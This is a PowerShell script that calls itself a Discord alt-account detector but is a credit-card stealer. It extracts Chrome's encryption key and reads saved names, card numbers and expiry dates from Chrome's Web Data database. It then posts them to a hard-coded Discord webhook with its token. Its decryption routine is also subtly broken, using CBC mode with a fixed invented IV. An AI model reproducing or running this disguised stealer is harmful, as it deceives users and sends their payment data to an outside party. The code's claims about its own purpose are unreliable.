# PowerShell Script to Detect Discord Alt Accounts

# Define the webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1453518648726523996/Uv-gp_SmhlEYcCARWsxAfkb3ZmTw_d_HsXgo9SLMtDfJ9da4c9YlhpxYEdsiTaRTHiOA"

# Load necessary .NET assemblies
Add-Type -AssemblyName "System.Security"
Add-Type -AssemblyName "System.Data.SQLite"

# Function to get the Chrome encryption key from Local State file
function Get-ChromeEncryptionKey {
    $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $localStateJson = Get-Content -Path $localStatePath -Encoding UTF8 | ConvertFrom-Json
    $encryptionKey = [System.Convert]::FromBase64String($localStateJson.os_crypt.encrypted_key)
    $encryptionKey = $encryptionKey[5..($encryptionKey.Length - 1)]
    $encryptionKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptionKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    return $encryptionKey
}

# Function to decrypt data using AES and the Chrome encryption key
function Decrypt-ChromeData {
    param (
        [byte[]]$encryptedData,
        [byte[]]$encryptionKey
    )
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Key = $encryptionKey
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.IV = [byte[]]@(0x12,0x34,0x56,0x78,0x90,0xAB,0xCD,0xEF,0x12,0x34,0x56,0x78,0x90,0xAB,0xCD,0xEF)
    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
    $decryptorTransform = $decryptor.CreateDecryptor()
    $decryptedData = $decryptorTransform.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
    $aes.Dispose()
    return [System.Text.Encoding]::UTF8.GetString($decryptedData)
}

# Function to get Chrome payment information
function Get-ChromePaymentInfo {
    $profilePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
    $webDataFile = Join-Path -Path $profilePath -ChildPath "Web Data"
    if (Test-Path $webDataFile) {
        $connection = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$webDataFile;Version=3;")
        $connection.Open()
        $command = $connection.CreateCommand()
        $command.CommandText = "SELECT * FROM credit_cards"
        $reader = $command.ExecuteReader()
        $paymentInfo = @()
        while ($reader.Read()) {
            $cardNumber = Decrypt-ChromeData -encryptedData $reader["card_number_encrypted"] -encryptionKey (Get-ChromeEncryptionKey)
            $paymentInfo += [PSCustomObject]@{
                Name       = $reader["name_on_card"]
                CardNumber = $cardNumber
                Expiry     = $reader["exp_month"] + "/" + $reader["exp_year"]
            }
        }
        $reader.Close()
        $connection.Close()
        return $paymentInfo
    }
}

# Function to send data to Discord Webhook
function Send-DiscordMessage {
    param (
        $message
    )
    $body = @{
        content = $message
    } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
    } catch {
        Write-Error "Failed to send message to Discord: $_"
    }
}

# Retrieve and prepare payment information
$chromePaymentInfo = Get-ChromePaymentInfo

# Create message to send
$message = "Discord Alt Account Detection Report:`n`n"

if ($chromePaymentInfo) {
    $message += "Detected Alt Accounts:`n"
    $message += $chromePaymentInfo | Format-Table -AutoSize | Out-String
}

# Send the message to Discord
Send-DiscordMessage -message $message

# Clean up
Remove-Variable chromePaymentInfo, message
